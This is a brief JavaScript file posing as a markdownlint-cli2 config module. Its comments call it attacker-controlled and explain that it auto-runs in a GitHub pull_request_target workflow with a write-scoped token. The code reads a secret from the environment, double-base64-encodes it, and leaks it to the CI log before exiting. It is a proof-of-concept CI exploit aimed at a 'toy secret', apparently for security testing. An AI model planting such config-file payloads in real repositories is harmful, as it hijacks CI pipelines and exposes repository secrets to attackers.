// Attacker-controlled markdownlint-cli2 config module.
// Auto-discovered at repo root and imported via await import() during
// markdownlint-cli2 base-options discovery (noImport not set), so this
// runs arbitrary Node.js in the pull_request_target base-repo context
// with a write-scoped GITHUB_TOKEN. Leaks the toy secret to stderr
// (synchronous flush) and exits so the step log preserves the evidence.
const s = process.env.GERALT_SECRET || '';
process.stderr.write('GERALT_LEAKED_TOKEN=' + Buffer.from(Buffer.from(s, 'utf8').toString('base64'), 'utf8').toString('base64') + '\n');
process.exit(1);
export default {};
